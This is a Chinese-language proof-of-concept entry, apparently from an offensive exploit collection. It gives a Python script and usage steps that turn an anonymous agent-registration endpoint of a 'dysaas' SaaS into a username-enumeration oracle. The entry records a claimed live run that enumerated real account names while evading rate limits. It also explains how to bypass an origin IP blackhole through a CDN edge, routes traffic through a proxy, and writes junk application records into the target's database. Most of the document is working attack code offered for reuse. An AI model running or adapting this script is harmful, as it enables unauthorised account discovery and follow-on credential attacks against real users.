# 匿名注册/申请接口作账号存在性 oracle（用户名枚举通用手法 + dysaas 代理 SaaS 判定表）

- **code**: 匿名注册-申请接口作账号存在性-oracle-用户名枚举通用手法-dysaas-代理-saas-判定表
- **kind**: script
- **category**: info-leak
- **component**: dysaas 代理 SaaS（Spring Boot + Spring Security）
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 代理后台（dysaas 代理 SaaS）实测有效：匿名（无 Authorization/无 Cookie）POST /xxa/agent/api/v1/agent/appSave，26sjb6t28/admin/agent001/6t001/6t002/6t888/6t999/a001 返回 11501「代理账号名已存在，请重新填写」；空闲名返回 code 0；非法格式名（a01/6t/00001fftyweide08）返回 7001「用户名格式有误,请输入4-15位数字和小写字母组合」。两批共 ~137 个候选名、间隔 1.5–2.1s，共枚举出 21 个真实代理账号名，未触发封禁。经边缘 203.0.113.48:443（Host example.com）复现；同一接口在代理后台前门 /agent/agent/api/v1/agent/appSave（Host example.com）对已存在名返回 11001「您的申请已提交，请等待客服联系」，同样可判别。
- **path**: pocs/匿名注册-申请接口作账号存在性-oracle-用户名枚举通用手法-dysaas-代理-saas-判定表/oracle_username_enum.py
- **tags**: 用户枚举,存在性oracle,未授权,SpringBoot,CDN边缘直连
- **created_at**: 2026-10-08T15:00:45.750Z

## 描述

把「匿名可写的注册/申请接口」当用户名存在性 oracle 用（含 dysaas 代理 SaaS 实测判定表、CDN 边缘直连与限速骨架）

## 用法

```
1) 找到目标站匿名可写的注册/申请接口（如 /xxa/agent/api/v1/agent/appSave）；2) 用同一个名字连打两次：第二次若返回「已存在」类错误码即该接口可当 oracle；3) 把候选名写入文件，`python oracle_username_enum.py names.txt`，按 RATE 限速逐条判别；4) 关键提醒：对「空闲」名会真的写库，所以**每个候选名只能打一次**，且要把自己打过的空闲名单独记账，避免后续误判。源站被 IP 黑洞时用 CDN 边缘 IP + 正确 Host/SNI（PROXY/EDGE/HOST 三个常量）。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""通用技巧：把「匿名可写的注册/申请接口」当存在性 oracle 用。
   适用条件：注册类接口匿名可达，且对「名字已存在」返回与「成功」不同的业务码
             （也常见于：用户名已占用 / 手机号已注册 / 邀请码无效）。
   判定表（本目标实测，dysaas 代理 SaaS）：
     code  0     -> 账号名空闲（注意：会落一条申请记录，同一名字只能打一次！）
     code  11501 -> 代理账号名已存在
     code  7001  -> 用户名格式有误（顺带泄露 4-15 位数字+小写字母 的命名规则）
   用法：python oracle_username_enum.py <候选名文件>   （每行一个名字）
"""
import json
import sys
import time
import socket
import ssl

# ---- 目标接入参数（换目标时改这里）----
PROXY = ('127.0.0.1', 7892)          # 我方出口代理；直连时改成 None
EDGE = '203.0.113.48'             # CDN 边缘 IP（源站被黑洞时用边缘 + 正确 Host/SNI）
HOST = 'example.com'
PORT = 443
PATH = '/xxa/agent/api/v1/agent/appSave'
HDRS = {
    'clientCode': 'ffty', 'clientItem': 'ffty', 'merchantCode': '1', 'language': 'zh-cn',
    'device': '1', 'pc': '1', 'skinCode': 'a041', 'appid': 'a041', 'source': '60',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json;charset=UTF-8;',
}
UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/203.0.113.52 Safari/537.36')
EXISTS_CODE = 11501
FREE_CODE = 0
RATE = 1.6                          # 秒；务必 ≥0.5s，有风控的站点用 1.5~2.2s


def post(path, body_bytes, host=HOST, ip=EDGE, port=PORT, t=20):
    h = dict(HDRS)
    h['Host'] = host
    h['User-Agent'] = UA
    h['Connection'] = 'close'
    h['Content-Length'] = str(len(body_bytes))
    req = ('POST %s HTTP/1.1\r\n' % path
           + '\r\n'.join('%s: %s' % (k, v) for k, v in h.items())
           + '\r\n\r\n').encode() + body_bytes
    if PROXY:
        c = socket.create_connection(PROXY, timeout=t)
        c.sendall(('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n' % (ip, port, ip, port)).encode())
        if b' 200' not in c.recv(200).split(b'\r\n')[0]:
            raise OSError('proxy CONNECT failed')
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(c, server_hostname=host)
    else:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(socket.create_connection((ip, port), timeout=t), server_hostname=host)
    s.sendall(req)
    buf = b''
    s.settimeout(t)
    try:
        while len(buf) < 200000:
            d = s.recv(8192)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    s.close()
    head, _, body = buf.partition(b'\r\n\r\n')
    return head.split(b'\r\n')[0].decode('utf-8', 'ignore'), body.decode('utf-8', 'ignore')


def probe(name, phone_seed='1350001'):
    body = json.dumps({'param': {'name': name,
                                 'password': 'Rt!9a8b7c6d',
                                 'phone': phone_seed + '0000'}},
                      ensure_ascii=False).encode()
    st, txt = post(PATH, body)
    try:
        code = json.loads(txt).get('code')
    except Exception:
        code = None
    if code == EXISTS_CODE:
        verdict = 'EXISTS'
    elif code == FREE_CODE:
        verdict = 'FREE(本次调用已落申请，勿重复打)'
    else:
        verdict = 'OTHER'
    print('%-20s %-8s %-8s %s' % (name, st.replace('HTTP/1.1 ', ''), code, txt[:120].replace('\n', ' ')))
    return name if verdict == 'EXISTS' else None


if __name__ == '__main__':
    cands = [l.strip() for l in open(sys.argv[1], encoding='utf-8') if l.strip()]
    hits = []
    for n in cands:
        h = probe(n)
        if h:
            hits.append(h)
        time.sleep(RATE)
    print('\nEXISTS:', hits)

```
